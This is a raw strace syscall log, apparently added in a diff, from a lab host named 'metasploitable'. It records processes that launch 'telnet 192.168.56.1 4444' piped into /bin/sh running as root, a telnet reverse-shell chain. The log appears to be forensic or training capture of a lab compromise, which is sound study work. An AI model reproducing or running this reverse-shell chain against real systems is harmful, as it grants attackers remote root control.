+[pid  4969] 15:03:28.942218 getrlimit(RLIMIT_NPROC, {rlim_cur=36*1024, rlim_max=36*1024}) = 0
+[pid  4969] 15:03:28.942242 brk(0x8101000) = 0x8101000
+[pid  4969] 15:03:28.942270 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4969] 15:03:28.942286 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4969] 15:03:28.942302 brk(0x8102000) = 0x8102000
+[pid  4969] 15:03:28.942318 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4969] 15:03:28.942386 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4969] 15:03:28.942405 clone(Process 4970 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9e6f8) = 4970
+[pid  4970] 15:03:28.942482 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4970] 15:03:28.942503 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4970] 15:03:28.942523 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4970] 15:03:28.942543 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4970] 15:03:28.942608 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4970] 15:03:28.942631 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4970] 15:03:28.942651 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4970] 15:03:28.942671 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4970] 15:03:28.942692 rt_sigaction(SIGINT, {0x8091fd0, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4970] 15:03:28.942727 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4970] 15:03:28.942745 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4970] 15:03:28.942767 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4970] 15:03:28.942810 pipe([1, 5]) = 0
+[pid  4970] 15:03:28.942844 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+[pid  4970] 15:03:28.942860 clone(Process 4971 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9e6f8) = 4971
+[pid  4971] 15:03:28.942923 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4971] 15:03:28.942940 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4971] 15:03:28.942960 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4971] 15:03:28.942980 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4971] 15:03:28.943037 close(1)    = 0
+[pid  4971] 15:03:28.943057 dup2(5, 1)  = 1
+[pid  4971] 15:03:28.943067 close(5)    = 0
+[pid  4971] 15:03:28.943131 stat64(".",  <unfinished ...>
+[pid  4618] 15:03:28.943143 waitpid(4967, Process 4618 suspended
+ <unfinished ...>
+[pid  4971] 15:03:28.943151 <... stat64 resumed> {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4971] 15:03:28.943183 stat64("/sbin/sleep", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4971] 15:03:28.943199 stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=24488, ...}) = 0
+[pid  4971] 15:03:28.943235 stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=24488, ...}) = 0
+[pid  4971] 15:03:28.943279 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+[pid  4971] 15:03:28.943300 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4971] 15:03:28.943320 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4971] 15:03:28.943340 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4971] 15:03:28.943359 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4971] 15:03:28.943386 execve("/bin/sleep", ["sleep", "4499"], [/* 14 vars */]) = 0
+[pid  4971] 15:03:28.943493 brk(0)      = 0x804f000
+[pid  4971] 15:03:28.943521 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4971] 15:03:28.943541 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc9000
+[pid  4971] 15:03:28.943557 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4971] 15:03:28.943579 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4971] 15:03:28.943595 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4971] 15:03:28.943628 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7fc1000
+[pid  4971] 15:03:28.943638 close(5)    = 0
+[pid  4971] 15:03:28.943651 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4971] 15:03:28.943674 open("/lib/tls/i686/cmov/librt.so.1", O_RDONLY) = 5
+[pid  4971] 15:03:28.943694 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220\31"..., 512) = 512
+[pid  4971] 15:03:28.943718 fstat64(5, {st_mode=S_IFREG|0644, st_size=30624, ...}) = 0
+[pid  4971] 15:03:28.943751 mmap2(NULL, 33360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7fb8000
+[pid  4971] 15:03:28.943764 mmap2(0xb7fbf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x6) = 0xb7fbf000
+[pid  4971] 15:03:28.943784 close(5)    = 0
+[pid  4971] 15:03:28.943796 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4971] 15:03:28.943815 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 5
+[pid  4971] 15:03:28.943834 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4971] 15:03:28.943855 fstat64(5, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4971] 15:03:28.943889 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7e69000
+[pid  4971] 15:03:28.943901 mmap2(0xb7fb2000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x149) = 0xb7fb2000
+[pid  4971] 15:03:28.943917 mmap2(0xb7fb5000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fb5000
+[pid  4971] 15:03:28.943933 close(5)    = 0
+[pid  4971] 15:03:28.943947 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4971] 15:03:28.943964 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 5
+[pid  4971] 15:03:28.943985 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\000"..., 512) = 512
+[pid  4971] 15:03:28.944006 fstat64(5, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
+[pid  4971] 15:03:28.944038 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e68000
+[pid  4971] 15:03:28.944052 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7e50000
+[pid  4971] 15:03:28.944063 mmap2(0xb7e64000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x13) = 0xb7e64000
+[pid  4971] 15:03:28.944080 mmap2(0xb7e66000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e66000
+[pid  4971] 15:03:28.944095 close(5)    = 0
+[pid  4971] 15:03:28.944119 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e4f000
+[pid  4971] 15:03:28.944132 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e4f6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4971] 15:03:28.944202 mprotect(0xb7fb2000, 4096, PROT_READ) = 0
+[pid  4971] 15:03:28.944220 munmap(0xb7fc1000, 29338) = 0
+[pid  4971] 15:03:28.944235 set_tid_address(0xb7e4f6f8) = 4971
+[pid  4971] 15:03:28.944244 set_robust_list(0xb7e4f700, 0xc) = 0
+[pid  4971] 15:03:28.944255 futex(0xbfab5030, 0x81 /* FUTEX_??? */, 1) = 0
+[pid  4971] 15:03:28.944272 rt_sigaction(SIGRTMIN, {0xb7e542c0, [], SA_SIGINFO}, NULL, 8) = 0
+[pid  4971] 15:03:28.944288 rt_sigaction(SIGRT_1, {0xb7e54340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
+[pid  4971] 15:03:28.944304 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
+[pid  4971] 15:03:28.944320 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
+[pid  4971] 15:03:28.944347 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  4971] 15:03:28.944509 brk(0)      = 0x804f000
+[pid  4971] 15:03:28.944519 brk(0x8070000) = 0x8070000
+[pid  4971] 15:03:28.944558 clock_gettime(CLOCK_MONOTONIC, {2534, 407555971}) = 0
+[pid  4971] 15:03:28.944572 nanosleep({4499, 0},  <unfinished ...>
+[pid  4967] 15:03:28.944594 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.944618 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4967] 15:03:28.944635 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.944647 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4967] 15:03:28.944663 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.944684 waitpid(-1, Process 4967 suspended
+ <unfinished ...>
+[pid  4969] 15:03:28.944699 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4969] 15:03:28.944715 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4969] 15:03:28.944734 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4969] 15:03:28.944746 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4969] 15:03:28.944763 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.944788 waitpid(-1, Process 4969 suspended
+ <unfinished ...>
+[pid  4970] 15:03:28.944803 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+[pid  4970] 15:03:28.944825 close(5)    = 0
+[pid  4970] 15:03:28.944849 close(5)    = -1 EBADF (Bad file descriptor)
+[pid  4970] 15:03:28.944861 pipe([5, 6]) = 0
+[pid  4970] 15:03:28.944887 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+[pid  4970] 15:03:28.944907 clone(Process 4972 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9e6f8) = 4972
+[pid  4972] 15:03:28.944970 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4972] 15:03:28.944988 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4972] 15:03:28.945008 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4972] 15:03:28.945027 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4972] 15:03:28.945056 close(5)    = 0
+[pid  4972] 15:03:28.945097 dup2(1, 0)  = 0
+[pid  4972] 15:03:28.945107 close(1)    = 0
+[pid  4972] 15:03:28.945116 dup2(6, 1)  = 1
+[pid  4972] 15:03:28.945126 close(6)    = 0
+[pid  4972] 15:03:28.945189 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4972] 15:03:28.945226 stat64("/sbin/telnet", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.945245 stat64("/bin/telnet", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.945261 stat64("/usr/sbin/telnet", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.945280 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  4972] 15:03:28.945335 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  4972] 15:03:28.945382 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+[pid  4972] 15:03:28.945403 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4972] 15:03:28.945422 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4972] 15:03:28.945443 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4972] 15:03:28.945462 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4972] 15:03:28.945488 execve("/usr/bin/telnet", ["telnet", "192.168.56.1", "4444"], [/* 14 vars */] <unfinished ...>
+[pid  4970] 15:03:28.956684 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+[pid  4970] 15:03:28.956840 close(1)    = 0
+[pid  4970] 15:03:28.956876 close(6)    = 0
+[pid  4970] 15:03:28.956904 close(1)    = -1 EBADF (Bad file descriptor)
+[pid  4970] 15:03:28.956915 close(6)    = -1 EBADF (Bad file descriptor)
+[pid  4970] 15:03:28.956926 pipe([1, 6]) = 0
+[pid  4970] 15:03:28.956956 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+[pid  4970] 15:03:28.956974 clone(Process 4973 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9e6f8) = 4973
+[pid  4973] 15:03:28.957044 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4973] 15:03:28.957063 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4973] 15:03:28.957083 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4973] 15:03:28.957103 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4973] 15:03:28.957140 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+[pid  4973] 15:03:28.957164 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4973] 15:03:28.957184 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4973] 15:03:28.957206 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4973] 15:03:28.957226 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4973] 15:03:28.957245 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4973] 15:03:28.957268 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4973] 15:03:28.957283 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4973] 15:03:28.957304 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4973] 15:03:28.957319 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4973] 15:03:28.957335 close(1)    = 0
+[pid  4973] 15:03:28.957376 dup2(5, 0)  = 0
+[pid  4973] 15:03:28.957380 close(5)    = 0
+[pid  4973] 15:03:28.957380 dup2(6, 1)  = 1
+[pid  4973] 15:03:28.957380 close(6)    = 0
+[pid  4973] 15:03:28.957380 dup2(1, 2)  = 2
+[pid  4973] 15:03:28.957380 fcntl64(1, F_GETFD) = 0
+[pid  4973] 15:03:28.957381 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4973] 15:03:28.957381 stat64("/sbin/sh", 0xbf95c198) = -1 ENOENT (No such file or directory)
+[pid  4973] 15:03:28.957387 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4973] 15:03:28.957423 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4973] 15:03:28.957462 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4973] 15:03:28.957479 clone(Process 4974 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9e6f8) = 4974
+[pid  4974] 15:03:28.957543 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4974] 15:03:28.957566 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.957586 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.957605 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.957630 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:28.957655 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:28.957674 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4974] 15:03:28.957737 execve("/bin/sh", ["sh"], [/* 14 vars */]) = 0
+[pid  4974] 15:03:28.957838 brk(0)      = 0x80f9000
+[pid  4974] 15:03:28.957868 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.957888 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee3000
+[pid  4974] 15:03:28.957907 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.957932 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4974] 15:03:28.957949 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4974] 15:03:28.957982 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7edb000
+[pid  4974] 15:03:28.957993 close(5)    = 0
+[pid  4974] 15:03:28.958006 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.958030 open("/lib/libncurses.so.5", O_RDONLY) = 5
+[pid  4974] 15:03:28.958047 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  4974] 15:03:28.958071 fstat64(5, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  4974] 15:03:28.958104 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7eab000
+[pid  4974] 15:03:28.958118 mmap2(0xb7ed8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x2c) = 0xb7ed8000
+[pid  4974] 15:03:28.958138 close(5)    = 0
+[pid  4974] 15:03:28.958152 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.958172 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 5
+[pid  4974] 15:03:28.958192 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  4974] 15:03:28.958214 fstat64(5, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  4974] 15:03:28.958247 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7ea7000
+[pid  4974] 15:03:28.958259 mmap2(0xb7ea9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x1) = 0xb7ea9000
+[pid  4974] 15:03:28.958278 close(5)    = 0
+[pid  4974] 15:03:28.958290 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.958308 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 5
+[pid  4974] 15:03:28.958327 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4974] 15:03:28.958348 fstat64(5, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4974] 15:03:28.958381 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ea6000
+[pid  4974] 15:03:28.958397 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d57000
+[pid  4974] 15:03:28.958408 mmap2(0xb7ea0000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x149) = 0xb7ea0000
+[pid  4974] 15:03:28.958425 mmap2(0xb7ea3000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ea3000
+[pid  4974] 15:03:28.958442 close(5)    = 0
+[pid  4974] 15:03:28.958469 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d56000
+[pid  4974] 15:03:28.958482 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d566b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4974] 15:03:28.958575 mprotect(0xb7ea0000, 4096, PROT_READ) = 0
+[pid  4974] 15:03:28.958622 munmap(0xb7edb000, 29338) = 0
+[pid  4974] 15:03:28.958658 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:28.958675 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+[pid  4974] 15:03:28.958702 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffba280) = -1 EINVAL (Invalid argument)
+[pid  4974] 15:03:28.958736 brk(0)      = 0x80f9000
+[pid  4974] 15:03:28.958747 brk(0x80fa000) = 0x80fa000
+[pid  4974] 15:03:28.958761 brk(0x80fb000) = 0x80fb000
+[pid  4974] 15:03:28.958784 getuid32()  = 0
+[pid  4974] 15:03:28.958794 getgid32()  = 0
+[pid  4974] 15:03:28.958804 geteuid32() = 0
+[pid  4974] 15:03:28.958814 getegid32() = 0
+[pid  4974] 15:03:28.958831 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:28.958848 time(NULL)  = 1478462608
+[pid  4974] 15:03:28.958862 brk(0x80fc000) = 0x80fc000
+[pid  4974] 15:03:28.958875 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffba388) = -1 EINVAL (Invalid argument)
+[pid  4974] 15:03:28.958892 brk(0x80fd000) = 0x80fd000
+[pid  4974] 15:03:28.958919 open("/proc/meminfo", O_RDONLY) = 5
+[pid  4974] 15:03:28.958948 fstat64(5, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  4974] 15:03:28.958983 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee2000
+[pid  4974] 15:03:28.959269 read(5, "MemTotal:      4152252 kB\nMemFre"..., 1024) = 846
+[pid  4974] 15:03:28.959321 close(5)    = 0
+[pid  4974] 15:03:28.959333 munmap(0xb7ee2000, 4096) = 0
+[pid  4974] 15:03:28.959357 brk(0x80fe000) = 0x80fe000
+[pid  4974] 15:03:28.959400 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.959442 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.959480 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:28.959499 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.959518 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:28.959538 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.959560 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:28.959574 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4974] 15:03:28.959606 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  4974] 15:03:28.959735 stat64("/etc/unreal", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:28.959774 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:28.959829 getpid()    = 4974
+[pid  4974] 15:03:28.959850 getppid()   = 4973
+[pid  4974] 15:03:28.959870 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4974] 15:03:28.959907 stat64("/sbin/sh", 0xbffba258) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.959923 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4974] 15:03:28.959958 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4974] 15:03:28.960007 socket(PF_FILE, SOCK_STREAM, 0) = 5
+[pid  4974] 15:03:28.960023 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  4974] 15:03:28.960039 connect(5, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.960083 close(5)    = 0
+[pid  4974] 15:03:28.960099 socket(PF_FILE, SOCK_STREAM, 0) = 5
+[pid  4974] 15:03:28.960109 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  4974] 15:03:28.960123 connect(5, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.960159 close(5)    = 0
+[pid  4974] 15:03:28.960176 open("/etc/nsswitch.conf", O_RDONLY) = 5
+[pid  4974] 15:03:28.960196 fstat64(5, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+[pid  4974] 15:03:28.960229 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee2000
+[pid  4974] 15:03:28.960242 read(5, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 475
+[pid  4974] 15:03:28.960270 read(5, "", 4096) = 0
+[pid  4974] 15:03:28.960280 close(5)    = 0
+[pid  4974] 15:03:28.960291 munmap(0xb7ee2000, 4096) = 0
+[pid  4974] 15:03:28.960312 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4974] 15:03:28.960328 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4974] 15:03:28.960361 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7edb000
+[pid  4974] 15:03:28.960373 close(5)    = 0
+[pid  4974] 15:03:28.960386 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.960408 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 5
